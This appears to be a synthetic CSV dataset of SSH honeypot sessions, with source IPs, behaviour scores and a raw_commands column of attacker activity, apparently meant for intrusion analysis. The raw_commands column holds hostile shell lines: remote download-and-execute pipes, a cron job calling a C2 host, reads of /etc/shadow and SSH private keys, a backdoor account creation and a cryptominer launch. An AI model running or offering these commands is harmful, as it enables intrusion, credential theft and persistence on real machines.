session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands
f02b499c9caa40bf,159.89.49.114,United States,1,0,0,2,22,0,0,0,0,0,0,0,0,0,
8488779712944309,211.94.20.175,China,5,1,3,27,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
6ade2e1b6fe94b19,68.183.39.102,United States,5,1,3,26,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &
8ac2079061af41a3,91.240.118.172,Ukraine,2,1,2,17,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
0b9e152c561548b5,218.92.0.158,China,5,0,0,15,22,0,0,0,0,0,0,0,0,0,
513b1fe923b240cf,92.255.57.210,Russia,2,1,3,19,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
2bcfd10de3a244df,167.71.13.196,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
ff885934e2544f8f,5.188.86.172,Russia,2,1,3,17,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
cf1491ff7dcf45f7,134.209.82.19,United States,5,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
cb630289cabf4b09,80.82.77.139,Netherlands,4,1,3,25,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
7b6b5049fcdd4c47,91.240.118.172,Ukraine,3,0,0,12,22,0,0,0,0,0,0,0,0,0,
53aaf0ec395b4f78,193.32.162.8,Russia,5,1,2,22,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
2e8c62820e2d4ce6,206.189.32.177,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,
8c1fe911eeba42b8,218.92.0.158,China,3,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
6566a47da1754641,104.236.198.48,United States,2,1,2,24,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
c7110b98b2e74153,218.92.0.158,China,5,0,0,14,22,0,0,0,0,0,0,0,0,0,
5957c1d1fb864505,58.218.211.36,China,1,1,1,12,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
74c3cfbdc0194d76,68.183.39.102,United States,4,0,0,13,22,0,0,0,0,0,0,0,0,0,
e02f7eb40f244ab5,198.199.65.32,United States,2,1,2,14,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
ee5a4fe4e07b4975,5.188.86.172,Russia,5,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
1474113296584bec,45.142.212.100,Netherlands,4,1,5,26,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
26c784b787ff4d7a,179.60.150.100,Brazil,3,1,3,27,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
487d0a2af92343d6,164.92.98.77,United States,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
a151e051b9df4b1b,206.189.32.177,United States,3,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
d74a64d859b043ad,134.209.82.19,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
61db3f73b32341fe,193.32.162.8,Russia,4,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
c385c8a24c2449d7,138.197.148.152,United States,5,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
b30cd930639a4f51,206.189.32.177,United States,1,0,0,5,22,0,0,0,0,0,0,0,0,0,
dbb3a85e3fb548cf,159.89.49.114,United States,4,0,0,11,22,0,0,0,0,0,0,0,0,0,
333374451b03490f,193.32.162.8,Russia,3,1,2,16,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
ed432191fa4d4dd5,103.99.0.122,India,5,1,1,20,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
a0e8366ad78f4319,68.183.39.102,United States,1,1,3,14,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
7297985c512547ab,198.199.65.32,United States,2,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
a487154c5243478c,58.218.211.36,China,2,1,5,29,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
9df7496d198a4a7b,179.60.150.100,Brazil,1,0,0,6,22,0,0,0,0,0,0,0,0,0,
f5c68d6f2a1740d3,222.186.15.101,China,1,1,2,13,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
e2446dd6a4344be6,164.92.98.77,United States,3,1,2,17,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
5598f4115f7444b6,138.197.148.152,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,
018889d236674586,117.21.191.131,China,1,1,2,15,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
b3018f065889480e,134.209.82.19,United States,4,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
17b2417919c24293,194.165.16.11,Russia,2,0,0,7,22,0,0,0,0,0,0,0,0,0,
51821b395add458b,134.209.82.19,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,
8a478cf868174c43,206.189.32.177,United States,1,1,1,6,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
847c6248ecaa4814,92.255.57.210,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,
ef8cbc0505574fc5,157.245.108.55,United States,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
